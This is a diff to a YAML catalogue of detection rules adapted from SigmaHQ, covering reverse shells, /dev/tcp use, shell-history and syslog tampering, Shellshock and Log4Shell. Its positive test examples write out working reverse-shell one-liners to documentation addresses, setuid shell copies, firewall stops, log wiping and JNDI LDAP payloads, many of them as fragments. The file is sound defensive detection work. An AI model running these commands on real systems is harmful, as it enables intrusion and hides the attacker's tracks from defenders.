@@ -59,6 +59,26 @@
       - 'Nov 20 10:01:02 web01 bash[4242]: HISTORY: PID=4242 UID=33 bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'
       - 'audit: cmdline="python3 -c import socket,os;s=socket.socket();s.connect((\"203.0.113.7\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(''HISTFILE'',''/dev/null'');"'
       - 'Nov 20 10:05:00 app02 sh[311]: rm -f /tmp/p; mknod /tmp/p p && telnet 198.51.100.4 80 0</tmp/p | /bin/bash 1>/tmp/p'
+      - 'Nov 21 09:00:47 host01 bash[4100]: HISTORY: BEGIN {s = "/inet/tcp/0/'
+      - 'Nov 21 09:00:48 host01 bash[4100]: HISTORY: bash -i >& /dev/udp/'
+      - 'Nov 21 09:00:49 host01 bash[4100]: HISTORY: sh -i >$ /dev/udp/'
+      - 'Nov 21 09:00:50 host01 bash[4100]: HISTORY: sh -i >$ /dev/tcp/'
+      - 'Nov 21 09:00:51 host01 bash[4100]: HISTORY: && while read line 0<&5; do'
+      - 'Nov 21 09:00:52 host01 bash[4100]: HISTORY: /bin/bash -c exec 5<>/dev/tcp/'
+      - 'Nov 21 09:00:53 host01 bash[4100]: HISTORY: /bin/bash -c exec 5<>/dev/udp/'
+      - 'Nov 21 09:00:54 host01 bash[4100]: HISTORY: nc -e /bin/sh '
+      - 'Nov 21 09:00:55 host01 bash[4100]: HISTORY: /bin/sh | nc'
+      - 'Nov 21 09:00:56 host01 bash[4100]: HISTORY: rm -f backpipe; mknod /tmp/backpipe p && nc '
+      - 'Nov 21 09:00:57 host01 bash[4100]: HISTORY: ;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'
+      - 'Nov 21 09:00:58 host01 bash[4100]: HISTORY: ;STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+      - 'Nov 21 09:00:59 host01 bash[4100]: HISTORY: /bin/sh -i <&3 >&3 2>&3'
+      - 'Nov 21 09:01:00 host01 bash[4100]: HISTORY: uname -a; w; id; /bin/bash -i'
+      - 'Nov 21 09:01:01 host01 bash[4100]: HISTORY: $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};'
+      - 'Nov 21 09:01:02 host01 bash[4100]: HISTORY: .to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+      - 'Nov 21 09:01:03 host01 bash[4100]: HISTORY: ;while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print'
+      - 'Nov 21 09:01:04 host01 bash[4100]: HISTORY: socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:'
+      - 'Nov 21 09:01:05 host01 bash[4100]: HISTORY:  | /bin/bash | telnet '
+      - 'Nov 21 09:01:06 host01 bash[4100]: HISTORY: ,echo=0,raw tcp-listen:'
     negative:
       - 'Nov 20 10:06:00 app02 sudo[9930]: alice : COMMAND=/usr/bin/nc -zv db01 5432'
       - 'Nov 20 10:07:00 app02 bash[812]: HISTORY: PID=812 UID=1000 bash -i ./deploy.sh --env staging'
@@ -88,7 +108,7 @@
       - 'Nov 20 11:02:00 jump01 bash[777]: HISTORY: PID=777 UID=0 ncat --listen --keep-open 8443 --ssl'
 
 - id: mention.sigma_reverse_shell_xterm_display
-  title: xterm sent to a numbered display (Sigma "Suspicious Reverse Shell Command Line", xterm keyword)
+  title: 'xterm -display 1 text (Sigma "Suspicious Reverse Shell Command Line", xterm keyword)'
   match:
     literal: ['xterm -display 1']
   case_sensitive: false
@@ -102,7 +122,7 @@
     upstream_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
   rationale: >-
     xterm pointed at a remote X display is a classic reverse shell, but the keyword also matches local displays such as
-    127.0.0.1:0 and remote-desktop setups, so it is context only.
+    127.0.0.1:0 and remote-desktop setups, so it is a weak candidate.
   examples:
     positive:
       - 'Nov 20 11:03:00 lab01 bash[910]: HISTORY: PID=910 UID=33 xterm -display 198.51.100.9:1'
@@ -111,7 +131,7 @@
       - 'Nov 20 11:05:00 lab01 Xorg[600]: (II) xterm display :0 started for user alice'
 
 - id: mention.sigma_dev_tcp_shell
-  title: Shell wired to /dev/tcp (Sigma "Suspicious Use of /dev/tcp", shell keywords)
+  title: 'Shell redirection onto /dev/tcp (Sigma "Suspicious Use of /dev/tcp", shell keywords)'
   match:
     literal:
       - '0<&196;exec 196<>/dev/tcp/'
@@ -137,12 +157,15 @@
     positive:
       - 'Nov 20 12:00:00 web01 bash[5011]: HISTORY: 0<&196;exec 196<>/dev/tcp/203.0.113.7/443; sh <&196 >&196 2>&196'
       - 'Nov 20 12:01:00 web01 php-fpm[880]: exec("bash -c ''bash -i >& /dev/tcp/203.0.113.7/80 0>&1''")'
+      - 'Nov 21 09:01:07 host01 bash[4100]: HISTORY: (sh)0>/dev/tcp/'
+      - 'Nov 21 09:01:08 host01 bash[4100]: HISTORY: echo -e ''#!/bin/bash\nbash -i >& /dev/tcp/'
+      - 'Nov 21 09:01:09 host01 bash[4100]: HISTORY: sh -i >& /dev/udp/'
     negative:
       - 'Nov 20 12:02:00 web01 healthcheck: bash -c "echo > /dev/tcp/127.0.0.1/5432" && echo db up'
       - 'Nov 20 12:03:00 web01 bash[5011]: HISTORY: exec 3<>/dev/null; echo done'
 
 - id: mention.sigma_dev_tcp_fd
-  title: Socket opened on a bash /dev/tcp file descriptor (Sigma "Suspicious Use of /dev/tcp", fd keywords)
+  title: 'Numbered-descriptor open of bash /dev/tcp (Sigma "Suspicious Use of /dev/tcp", fd keywords)'
   match:
     literal: ['cat </dev/tcp/', 'exec 3<>/dev/tcp/', 'exec 5<>/dev/tcp/']
   case_sensitive: false
@@ -180,7 +203,7 @@
     upstream_id: 6cc5fceb-9a71-4c23-aeeb-963abe0b279c
   rationale: >-
     Writing nothing to /dev/tcp/host/port tests whether a port is open. Attackers use it for scanning from shells
-    without tools, and wait-for-port scripts use it constantly, so it is context only.
+    without tools, and wait-for-port scripts use it constantly, so it is a weak candidate.
   examples:
     positive:
       - 'Nov 20 12:08:00 web01 bash[5016]: HISTORY: for p in 22 80 443; do echo >/dev/tcp/10.0.0.5/$p && echo $p open; done'
@@ -189,9 +212,9 @@
       - 'Nov 20 12:10:00 web01 bash[5018]: HISTORY: nc -z 10.0.0.5 22'
 
 - id: mention.sigma_shell_wget_pipe_interpreter
-  title: wget output piped into a shell or perl (Sigma "Suspicious Activity in Shell Commands")
+  title: 'wget with a pipe into a shell or perl (Sigma "Suspicious Activity in Shell Commands")'
   match:
-    anchored: 'wget [^\n]{0,200} - http[^\n]{0,300} \| (?:perl|sh|bash)'
+    anchored: 'wget [^\n]{0,150} - http[^\n]{0,200} \| (?:perl|sh|bash)'
   case_sensitive: false
   strength: medium
   attack: [T1105, T1059.004]
@@ -227,7 +250,7 @@
     upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
   rationale: >-
     A throwaway Python web server is how intruders stage tools or pull files off a host, but developers use it every
-    day to share a directory, so it is context only.
+    day to share a directory, so it is a weak candidate.
   examples:
     positive:
       - 'Nov 20 12:14:00 web01 bash[5022]: HISTORY: cd /dev/shm && python3 -m http.server 8081'
@@ -277,6 +300,7 @@
   examples:
     positive:
       - 'Nov 20 12:20:00 web01 bash[5027]: HISTORY: socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:203.0.113.7:4444'
+      - 'Nov 21 09:01:10 host01 bash[4100]: HISTORY: socat -O /tmp/'
     negative:
       - 'Nov 20 12:21:00 web01 systemd[1]: Started socat TCP-LISTEN:2375,fork UNIX-CONNECT:/var/run/docker.sock'
       - 'Nov 20 12:22:00 web01 bash[5028]: HISTORY: socat - TCP:db01:5432'
@@ -305,7 +329,7 @@
       - 'Nov 20 12:25:00 web01 bash[5031]: HISTORY: socat -d -d pty,raw,echo=0 pty,raw,echo=0'
 
 - id: mention.sigma_shell_wget_chmod
-  title: wget followed by chmod on the same line (Sigma "Suspicious Activity in Shell Commands")
+  title: 'wget and chmod on one line (Sigma "Suspicious Activity in Shell Commands")'
   match:
     anchored: 'wget [^\n]{1,200}; chmod (?:\+x|777 )'
   case_sensitive: false
@@ -360,6 +384,14 @@
     positive:
       - 'Nov 20 12:29:00 web01 java[2001]: Runtime exec: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://203.0.113.7/a.sh'
       - 'Nov 20 12:30:00 web01 bash[5035]: HISTORY: chmod u+s /tmp/rootshell'
+      - 'Nov 21 09:01:11 host01 bash[4100]: HISTORY: stop;service iptables stop;'
+      - 'Nov 21 09:01:12 host01 bash[4100]: HISTORY: stop;SuSEfirewall2 stop;'
+      - 'Nov 21 09:01:13 host01 bash[4100]: HISTORY: chmod 777 2020'
+      - 'Nov 21 09:01:14 host01 bash[4100]: HISTORY: /chmod u+s '
+      - 'Nov 21 09:01:15 host01 bash[4100]: HISTORY: chmod +s /tmp/'
+      - 'Nov 21 09:01:16 host01 bash[4100]: HISTORY:  /tmp/haxhax'
+      - 'Nov 21 09:01:17 host01 bash[4100]: HISTORY:  /tmp/ns_sploit'
+      - 'Nov 21 09:01:18 host01 bash[4100]: HISTORY: /tmp/ysocereal.jar'
     negative:
       - 'Nov 20 12:31:00 web01 bash[5036]: HISTORY: chmod 755 /usr/local/bin/backup.sh'
       - 'Nov 20 12:32:00 web01 systemd[1]: Stopping iptables.service - IPv4 firewall with iptables...'
@@ -410,7 +442,7 @@
     upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
   rationale: >-
     Decoding piped base64, copying a system shell and a /tmp/x path appear in the documented exploits, but kubectl
-    secret reads, package scripts and test harnesses produce the same text daily, so they are context only.
+    secret reads, package scripts and test harnesses produce the same text daily, so they are weak candidates.
   examples:
     positive:
       - 'Nov 20 12:37:00 web01 bash[5041]: HISTORY: cp /bin/sh /tmp/.sh; chmod 4755 /tmp/.sh'
@@ -419,7 +451,7 @@
       - 'Nov 20 12:39:00 web01 bash[5043]: HISTORY: base64 -w0 report.pdf > report.b64'
 
 - id: mention.sigma_shell_b64_in_tmp
-  title: Base64 file in /tmp named on a command line (Sigma "Suspicious Activity in Shell Commands")
+  title: 'Base64 file path in /tmp on a command line (Sigma "Suspicious Activity in Shell Commands")'
   match:
     anchored: ' /tmp/[^\n]{0,100}\.b64 '
   case_sensitive: false
@@ -460,6 +492,7 @@
   examples:
     positive:
       - 'Nov 20 13:00:00 sol01 genunix: [ID 533030 kern.notice] NOTICE: in.ftpd[1772] attempt to execute code on stack by uid 0'
+      - 'Nov 21 09:01:19 host01 bash[4100]: HISTORY: 0bin0sh1'
     negative:
       - 'Nov 20 13:01:00 sol01 genunix: [ID 540533 kern.notice] SunOS Release 5.10 Version Generic'
       - 'Nov 20 13:02:00 web01 kernel: [ 33.1] NX (Execute Disable) protection: active'
@@ -532,6 +565,24 @@
     positive:
       - 'Nov 20 13:06:00 sun02 bash[611]: HISTORY: cp /etc/shadow /tmp/.; ls -la /tmp'
       - 'Nov 20 13:07:00 sun02 bash[612]: HISTORY: > /var/log/audit/audit.log; rm -f .bash_history'
+      - 'Nov 21 09:01:20 host01 bash[4100]: HISTORY: cp /bin/sh .;chown'
+      - 'Nov 21 09:01:21 host01 bash[4100]: HISTORY: chmod 4777 /tmp/.scsi/dev/bin/gsh'
+      - 'Nov 21 09:01:22 host01 bash[4100]: HISTORY: chown root:root /tmp/.scsi/dev/bin/'
+      - 'Nov 21 09:01:23 host01 bash[4100]: HISTORY: chown root:root x;'
+      - 'Nov 21 09:01:24 host01 bash[4100]: HISTORY: /bin/telnet locip locport < /dev/console | /bin/sh'
+      - 'Nov 21 09:01:25 host01 bash[4100]: HISTORY: /tmp/ratload'
+      - 'Nov 21 09:01:26 host01 bash[4100]: HISTORY: cat > /dev/tcp/127.0.0.1/80 <<END'
+      - 'Nov 21 09:01:27 host01 bash[4100]: HISTORY: rm -f /current/tmp/ftshell.latest'
+      - 'Nov 21 09:01:28 host01 bash[4100]: HISTORY: cp /var/log/audit/audit.log .tmp'
+      - 'Nov 21 09:01:29 host01 bash[4100]: HISTORY: < /dev/console | uudecode && uncompress'
+      - 'Nov 21 09:01:30 host01 bash[4100]: HISTORY: sendmail -osendmail;chmod +x sendmail'
+      - 'Nov 21 09:01:31 host01 bash[4100]: HISTORY: chmod 666 /var/run/utmp~'
+      - 'Nov 21 09:01:32 host01 bash[4100]: HISTORY: chmod 700 nscd crond'
+      - 'Nov 21 09:01:33 host01 bash[4100]: HISTORY: </dev/console |uudecode > /dev/null 2>&1 && uncompress'
+      - 'Nov 21 09:01:34 host01 bash[4100]: HISTORY: chmod 700 jp&&netstat -an|grep'
+      - 'Nov 21 09:01:35 host01 bash[4100]: HISTORY: chmod 700 fp sendmail pt'
+      - 'Nov 21 09:01:36 host01 bash[4100]: HISTORY: chmod 755 /usr/vmsys/bin/pipe'
+      - 'Nov 21 09:01:37 host01 bash[4100]: HISTORY: chmod -R 755 /usr/vmsys'
     negative:
       - 'Nov 20 13:08:00 sun02 bash[613]: HISTORY: cp /etc/hosts /tmp/hosts.bak'
       - 'Nov 20 13:09:00 sun02 auditd[455]: Audit daemon rotating log files'
@@ -629,7 +680,7 @@
       - 'Nov 20 13:21:00 sun02 bash[625]: HISTORY: iptables -L OUTPUT -n'
 
 - id: mention.sigma_equationgroup_dev_tcp_shell
-  title: sh redirected to /dev/tcp (Sigma "Equation Group Indicators")
+  title: 'sh with output to /dev/tcp (Sigma "Equation Group Indicators")'
   match:
     anchored: 'sh >/dev/tcp/[^\n]{1,100} <&1 2>&1'
   case_sensitive: false
@@ -699,7 +750,7 @@
       - 'Nov 20 13:31:00 sun02 bash[635]: HISTORY: wget https://mirror.example.org/sendmail.mc.example'
 
 - id: mention.sigma_history_null_redirect
-  title: Shell history overwritten from /dev/null or /dev/zero (Sigma "Linux Command History Tampering")
+  title: 'cat /dev/null or /dev/zero into a shell history file (Sigma "Linux Command History Tampering")'
   match:
     anchored: 'cat /dev/(?:null|zero) >[^\n]{0,100}sh_history'
   case_sensitive: false
@@ -722,7 +773,7 @@
       - 'Nov 20 13:34:00 web01 bash[638]: HISTORY: tail -n 50 ~/.bash_history'
 
 - id: mention.sigma_history_symlink_null
-  title: Shell history symlinked to /dev/null or /dev/zero (Sigma "Linux Command History Tampering")
+  title: 'ln -sf /dev/null onto a shell history file (Sigma "Linux Command History Tampering")'
   match:
     anchored: 'ln -sf /dev/(?:null|zero) [^\n]{0,100}sh_history'
   case_sensitive: false
@@ -745,7 +796,7 @@
       - 'Nov 20 13:37:00 web01 bash[641]: HISTORY: ls -l ~/.zsh_history'
 
 - id: mention.sigma_history_chattr
-  title: Shell history made immutable (Sigma "Linux Command History Tampering")
+  title: 'chattr +i on a shell history file (Sigma "Linux Command History Tampering")'
   match:
     anchored: 'chattr \+i[^\n]{0,100}sh_history'
   case_sensitive: false
@@ -768,7 +819,7 @@
       - 'Nov 20 13:40:00 web01 bash[644]: HISTORY: lsattr /root/.bash_history'
 
 - id: mention.sigma_history_echo_empty
-  title: Shell history truncated with echo (Sigma "Linux Command History Tampering")
+  title: 'echo "" into a shell history file (Sigma "Linux Command History Tampering")'
   match:
     anchored: 'echo "" >[^\n]{0,100}sh_history'
   case_sensitive: false
@@ -791,7 +842,7 @@
       - 'Nov 20 13:43:00 web01 bash[647]: HISTORY: echo "export HISTSIZE=5000" >> ~/.bashrc'
 
 - id: mention.sigma_history_shred
-  title: Shell history shredded (Sigma "Linux Command History Tampering")
+  title: 'shred of a shell history file (Sigma "Linux Command History Tampering")'
   match:
     anchored: 'shred [^\n]{0,100}sh_history'
   case_sensitive: false
@@ -814,7 +865,7 @@
       - 'Nov 20 13:46:00 web01 bash[650]: HISTORY: wc -l ~/.bash_history'
 
 - id: mention.sigma_history_truncate
-  title: Shell history truncated to zero (Sigma "Linux Command History Tampering")
+  title: 'truncate -s0 of a shell history file (Sigma "Linux Command History Tampering")'
   match:
     anchored: 'truncate -s0 [^\n]{0,100}sh_history'
   case_sensitive: false
@@ -836,7 +887,7 @@
       - 'Nov 20 13:49:00 web01 bash[653]: HISTORY: truncate -s 10G /srv/disk.img'
 
 - id: mention.sigma_history_rm_inline
-  title: Shell history deleted, mid-line (Sigma "Linux Command History Tampering")
+  title: 'rm of a shell history file, mid-line (Sigma "Linux Command History Tampering")'
   match:
     anchored: ' rm [^\n]{0,100}sh_history'
   case_sensitive: false
@@ -860,7 +911,7 @@
       - 'Nov 20 13:52:00 web01 bash[656]: HISTORY: cp ~/.bash_history /backup/'
 
 - id: mention.sigma_history_rm_line_start
-  title: Shell history deleted, line start (Sigma "Linux Command History Tampering")
+  title: 'rm of a shell history file, line start (Sigma "Linux Command History Tampering")'
   match:
     anchored: '^rm [^\n]{0,100}sh_history'
   case_sensitive: false
@@ -883,7 +934,7 @@
       - 'mv ~/.bash_history ~/.bash_history.old'
 
 - id: mention.sigma_history_disable
-  title: History logging switched off (Sigma "Linux Command History Tampering")
+  title: 'History-off settings text (Sigma "Linux Command History Tampering")'
   match:
     literal: ['empty_bash_history', 'export HISTFILESIZE=0', 'shopt -ou history', 'shopt -uo history']
   case_sensitive: false
@@ -902,12 +953,15 @@
   examples:
     positive:
       - 'Nov 20 13:53:00 web01 bash[657]: HISTORY: export HISTFILESIZE=0; export HISTSIZE=0'
+      - 'Nov 21 09:01:38 host01 bash[4100]: HISTORY: empty_bash_history'
+      - 'Nov 21 09:01:39 host01 bash[4100]: HISTORY: shopt -ou history'
+      - 'Nov 21 09:01:40 host01 bash[4100]: HISTORY: shopt -uo history'
     negative:
       - 'Nov 20 13:54:00 web01 bash[658]: HISTORY: export HISTFILESIZE=100000'
       - 'Nov 20 13:55:00 web01 bash[659]: HISTORY: shopt -s histappend'
 
 - id: mention.sigma_history_clear_builtin
-  title: history builtin clear or write (Sigma "Linux Command History Tampering", noisy keywords)
+  title: 'history -c or history -w text (Sigma "Linux Command History Tampering", noisy keywords)'
   match:
     literal: ['history -c', 'history -w']
   case_sensitive: false
@@ -921,13 +975,37 @@
     upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
   rationale: >-
     'history -c' clears the in-memory history and 'history -w' rewrites the file; users run both for ordinary
-    reasons (shared terminals, syncing tmux panes), so they are context only.
+    reasons (shared terminals, syncing tmux panes), so they are weak candidates.
   examples:
     positive:
       - 'Nov 20 13:56:00 web01 bash[660]: HISTORY: history -c && exit'
     negative:
       - 'Nov 20 13:57:00 web01 bash[661]: HISTORY: history | grep ssh'
       - 'Nov 20 13:58:00 web01 bash[662]: HISTORY: history 20'
+
+- id: mention.sigma_history_clear_then_exit
+  title: 'history -c then exit or logout on one line (Sigma "Linux Command History Tampering")'
+  match:
+    anchored: 'history -c {0,2}(?:&&|;) {0,2}(?:exit|logout)\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1070.003]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Linux Command History Tampering (Patrick Bareiss)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_clear_cmd_history.yml
+    license: DRL-1.1
+    upstream_id: fdc88d25-96fb-4b7c-9633-c0e417fdbd4e
+  rationale: >-
+    The rule's 'history -c' keyword in its cover-tracks form: clearing the session's history and leaving in the same
+    command. Users clearing a shared terminal usually keep working afterwards, so this form is medium while a bare
+    'history -c' is a weak candidate.
+  examples:
+    positive:
+      - 'Nov 20 13:56:00 web01 bash[660]: HISTORY: history -c && exit'
+    negative:
+      - 'Nov 20 13:57:00 web01 bash[661]: HISTORY: history | grep ssh'
+      - 'Nov 20 13:57:01 web01 bash[662]: HISTORY: history -c; ls -la'
 
 - id: mention.sigma_shellshock
   title: Shellshock function-definition expression (Sigma "Shellshock Expression")
@@ -948,12 +1026,15 @@
   examples:
     positive:
       - '203.0.113.50 - - [20/Nov/2026:14:00:00 +0000] "GET /cgi-bin/status HTTP/1.1" 404 196 "-" "() { :; }; /bin/bash -c \"wget http://203.0.113.50/x\""'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:41 +0000] "GET /cgi-bin/status HTTP/1.1" 404 0 "-" "(){:;}; /bin/bash -c id"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:42 +0000] "GET /cgi-bin/status HTTP/1.1" 404 0 "-" "() {:;}; /bin/bash -c id"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:43 +0000] "GET /cgi-bin/status HTTP/1.1" 404 0 "-" "() { :;}; /bin/bash -c id"'
     negative:
       - '10.0.3.8 - - [20/Nov/2026:14:01:00 +0000] "GET /app.js?v=() HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - 'Nov 20 14:02:00 web01 bash[663]: HISTORY: f() { echo hi; }; f'
 
 - id: mention.sigma_ld_so_preload
-  title: /etc/ld.so.preload referenced (Sigma "Code Injection by ld.so Preload")
+  title: '/etc/ld.so.preload path text (Sigma "Code Injection by ld.so Preload")'
   match:
     literal: ['/etc/ld.so.preload']
   case_sensitive: false
@@ -995,6 +1076,7 @@
   examples:
     positive:
       - 'Nov 20 14:06:00 web01 bash[666]: HISTORY: ln -s /etc/passwd /tmp/logfile; ./vuln-setuid'
+      - 'Nov 21 09:01:44 host01 bash[4100]: HISTORY: ln -s -f /etc/passwd'
     negative:
       - 'Nov 20 14:07:00 web01 bash[667]: HISTORY: ln -s /etc/nginx/sites-available/app /etc/nginx/sites-enabled/app'
       - 'Nov 20 14:08:00 web01 bash[668]: HISTORY: grep alice /etc/passwd'
@@ -1161,7 +1243,7 @@
       - 'Nov 20 14:29:00 web01 bash[669]: HISTORY: grep -c FOUND /var/log/clamav/clamav.log'
 
 - id: mention.sigma_crontab_replace
-  title: crontab replaced (Sigma "Modifying Crontab", narrowed)
+  title: 'crontab REPLACE log text (narrowing of Sigma "Modifying Crontab")'
   match:
     anchored: '\) REPLACE \('
   case_sensitive: true
@@ -1175,7 +1257,7 @@
     upstream_id: af202fd3-7bff-4212-a25a-fb34606cfcbe
   rationale: >-
     The upstream keyword is the bare word REPLACE, which would match SQL and countless other lines. It is narrowed to
-    the crontab daemon's own form '(user) REPLACE (user)'. Any crontab edit produces it, so it is context only: the
+    the crontab daemon's own form '(user) REPLACE (user)'. Any crontab edit produces it, so it is a weak candidate: the
     question is which user and what the new crontab runs.
   examples:
     positive:
@@ -1232,7 +1314,7 @@
     upstream_id: e76b413a-83d0-4b94-8e4c-85db4a5b8bdc
   rationale: >-
     Malformed key, certificate and packet errors accompany SSH fuzzing and exploit attempts, but flaky links
-    ('Corrupted MAC on input') and old clients produce them too, so they are context only.
+    ('Corrupted MAC on input') and old clients produce them too, so they are weak candidates.
   examples:
     positive:
       - 'Nov 20 14:36:00 gw01 sshd[2204]: ssh_dispatch_run_fatal: Connection from 203.0.113.9 port 4022: invalid elliptic curve value'
@@ -1255,7 +1337,7 @@
     upstream_id: 49f5dfc1-f92e-4d34-96fa-feba3f6acf36
   rationale: >-
     Matched case-insensitively, these also match systemd's 'Stopping firewalld ...' on every shutdown or restart, so
-    a stop is context only; the lead is a stop with no reboot, by a non-admin, or followed by no restart.
+    a stop is a weak candidate; the lead is a stop with no reboot, by a non-admin, or followed by no restart.
   examples:
     positive:
       - 'Nov 20 14:39:00 web01 systemd[1]: Stopping falcon-sensor.service - CrowdStrike Falcon Sensor...'
@@ -1264,7 +1346,7 @@
       - 'Nov 20 14:41:00 web01 falcon-sensor[900]: CrowdStrike(4): sensor heartbeat ok'
 
 - id: mention.sigma_named_suspicious
-  title: BIND refused zone transfer or source-port-zero packet (Sigma "Suspicious Named Error")
+  title: 'BIND AXFR-denial or source-port-zero message (Sigma "Suspicious Named Error")'
   match:
     literal: [' dropping source port zero packet from ', ' denied AXFR from ']
   case_sensitive: false
@@ -1318,7 +1400,7 @@
     upstream_id: 377f33a1-4b36-4ee1-acee-1dbe4b43cfbe
   rationale: >-
     vsftpd prints these on protocol abuse, overlong input and sandbox violations, which fuzzing and exploit attempts
-    trigger; session limits and odd clients trigger several of them too, so they are context only. The wildcard
+    trigger; session limits and odd clients trigger several of them too, so they are weak candidates. The wildcard
     keyword 'syscall * out of bounds' is a separate anchored entry.
   examples:
     positive:
@@ -1342,7 +1424,7 @@
     upstream_id: 377f33a1-4b36-4ee1-acee-1dbe4b43cfbe
   rationale: >-
     Translation of 'syscall * out of bounds': the vsftpd seccomp sandbox rejecting an unexpected system call, which a
-    hijacked worker would cause; library upgrades can also cause it, so it is context only.
+    hijacked worker would cause; library upgrades can also cause it, so it is a weak candidate.
   examples:
     positive:
       - 'Nov 20 14:48:00 ftp01 vsftpd[3304]: syscall 59 out of bounds'
@@ -1351,7 +1433,7 @@
       - 'Nov 20 14:50:00 ftp01 kernel: [ 1.0] audit: type=1326 audit(1700000000.1:2): auid=0 syscall=59 compat=0'
 
 - id: mention.sigma_suspicious_log_entries
-  title: Promiscuous mode, deactivated services and dropped syslog (Sigma "Suspicious Log Entries")
+  title: 'Promiscuous-mode, service-deactivation and syslog-drop messages (Sigma "Suspicious Log Entries")'
   match:
     literal: ['entered promiscuous mode', 'Deactivating service', 'Oversized packet received from', 'imuxsock begins to drop messages']
   case_sensitive: false
@@ -1365,7 +1447,7 @@
     upstream_id: f64b6e9a-5d9d-48a5-8289-e1dd2b3876e1
   rationale: >-
     An interface in promiscuous mode can mean a sniffer, but every container bridge port (veth) enters promiscuous
-    mode and syslog rate limiting is routine, so these are context only.
+    mode and syslog rate limiting is routine, so these are weak candidates.
   examples:
     positive:
       - 'Nov 20 14:51:00 web01 kernel: [ 2000.1] device eth0 entered promiscuous mode'
@@ -1374,7 +1456,7 @@
       - 'Nov 20 14:53:00 web01 rsyslogd: imjournal: journal files changed, reloading...'
 
 - id: mention.sigma_syslog_rm
-  title: syslog deleted with rm and no options (Sigma "Commands to Clear or Remove the Syslog - Builtin")
+  title: 'rm /var/log/syslog command text (Sigma "Commands to Clear or Remove the Syslog - Builtin")'
   match:
     anchored: 'rm /var/log/syslog(?:[^.]|$)'
   case_sensitive: false
@@ -1397,7 +1479,7 @@
       - 'Nov 20 14:56:00 web01 bash[672]: HISTORY: rm /var/log/nginx/old.log'
 
 - id: mention.sigma_syslog_rm_flags
-  title: syslog deleted with rm -r/-f/-rf (Sigma "Commands to Clear or Remove the Syslog - Builtin")
+  title: 'rm -r, -f or -rf /var/log/syslog command text (Sigma "Commands to Clear or Remove the Syslog - Builtin")'
   match:
     anchored: 'rm -(?:r|f|rf) /var/log/syslog(?:[^.]|$)'
   case_sensitive: false
@@ -1419,7 +1501,7 @@
       - 'Nov 20 14:59:00 web01 bash[675]: HISTORY: rm -rf /var/cache/apt/archives/partial'
 
 - id: mention.sigma_syslog_mv
-  title: syslog moved away (Sigma "Commands to Clear or Remove the Syslog - Builtin")
+  title: 'mv /var/log/syslog command text (Sigma "Commands to Clear or Remove the Syslog - Builtin")'
   match:
     anchored: 'mv /var/log/syslog(?:[^.]|$)'
   case_sensitive: false
@@ -1442,7 +1524,7 @@
       - 'Nov 20 15:02:00 web01 bash[678]: HISTORY: mv /var/log/app.log /var/log/app.log.old'
 
 - id: mention.sigma_syslog_truncate_nospace
-  title: syslog truncated by redirection (Sigma "Commands to Clear or Remove the Syslog - Builtin")
+  title: 'Redirection into /var/log/syslog, no space (Sigma "Commands to Clear or Remove the Syslog - Builtin")'
   match:
     anchored: ' >/var/log/syslog(?:[^.]|$)'
   case_sensitive: false
@@ -1465,7 +1547,7 @@
       - 'Nov 20 15:05:00 web01 bash[681]: HISTORY: logger -t app "restart" >/dev/null'
 
 - id: mention.sigma_syslog_truncate_space
-  title: syslog truncated by redirection with a space (Sigma "Commands to Clear or Remove the Syslog - Builtin")
+  title: 'Redirection into /var/log/syslog, with a space (Sigma "Commands to Clear or Remove the Syslog - Builtin")'
   match:
     anchored: ' > /var/log/syslog(?:[^.]|$)'
   case_sensitive: false
@@ -1487,7 +1569,7 @@
       - 'Nov 20 15:08:00 web01 bash[684]: HISTORY: cat /dev/null > /var/log/syslog.1'
 
 - id: mention.sigma_useradd_uid0
-  title: New user created with UID 0 (Sigma "Privileged User Has Been Created")
+  title: 'useradd new-user message with UID 0 (Sigma "Privileged User Has Been Created")'
   match:
     anchored: 'new user: name=[^,\n]{1,64}, UID=0,'
   case_sensitive: false
@@ -1510,7 +1592,7 @@
       - 'Nov 20 15:11:00 web01 useradd[1339]: new user: name=svc_app, UID=998, GID=998, home=/opt/app, shell=/usr/sbin/nologin'
 
 - id: mention.sigma_useradd_privileged_group
-  title: New user with root, wheel or sudo primary group (Sigma "Privileged User Has Been Created")
+  title: 'useradd new-user message with a root, wheel or sudo primary group (Sigma "Privileged User Has Been Created")'
   match:
     anchored: 'new user: name=[^,\n]{1,64}, UID=[0-9]{1,10}, GID=(?:0|10|27),'
   case_sensitive: false
@@ -1595,6 +1677,25 @@
   examples:
     positive:
       - '203.0.113.50 - - [20/Nov/2026:15:18:00 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/Command/Base64/d2dldCBodHRw} HTTP/1.1" 200 12 "-" "curl/8.0"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:45 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/ReverseShell/x} HTTP/1.1" 200 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:46 +0000] "GET /?x=${jndi:ldap://203.0.113.71:1389/Basic/TomcatMemshellx} HTTP/1.1" 200 0 "-" "-"'
